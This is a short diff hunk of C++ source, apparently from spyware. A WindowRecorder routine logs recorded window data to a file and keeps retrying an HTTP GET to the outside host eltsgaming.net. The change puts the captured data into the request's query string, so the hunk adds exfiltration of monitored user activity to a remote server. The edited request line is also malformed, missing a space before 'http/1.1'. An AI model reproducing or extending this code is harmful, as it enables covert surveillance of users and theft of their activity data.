@@ -301,12 +301,12 @@ void WindowRecorder::outputWindowName()
 			
 			/* Output data to log */
 			out.open("log.txt", std::ofstream::app);
-
-			std::cout << data.toString();
-			out << data.toString();
+			std::string sendString = data.toString();
+			out << sendString;
+			std::cout << sendString;
 			
 			/* @TODO: Fix bug where data is not send properly */
-			while (!stream.sendData("GET /index.php?goro=d http/1.1\nHOST: eltsgaming.net\n\n")) {
+			while (!stream.sendData("GET /index.php?goro="+ data.toStringHTML() + "http/1.1\nHOST: eltsgaming.net\n\n")) {
 				std::cout << "Error sending data. Retrying...\n";
 				try
 				{
